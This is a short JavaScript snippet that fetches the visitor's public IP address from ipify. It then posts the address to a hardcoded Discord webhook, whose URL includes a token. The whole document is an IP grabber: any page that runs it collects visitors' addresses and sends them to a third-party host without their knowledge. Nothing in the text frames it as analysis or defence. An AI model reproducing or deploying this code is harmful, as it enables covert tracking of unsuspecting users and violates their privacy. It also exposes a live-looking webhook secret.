const getIP = async () => {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    const userIP = data.ip;
    console.log(`User's IP: ${userIP}`);
    
    const sendToWebhook = async () => {
      const webhookURL = 'https://discord.com/api/webhooks/1210637809141157968/gG_ZK7zerOfFmfTlR0WPkQA5Pfjml8SXiJxVYdjO4cjTqiIi6JoOZI5wvbiivSR6X5jU';
      
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: `User's IP: ${userIP}` }),
      });
  
      console.log(`IP Sent to Discord!`);
    };
  
    sendToWebhook();
  };
  
  getIP();
  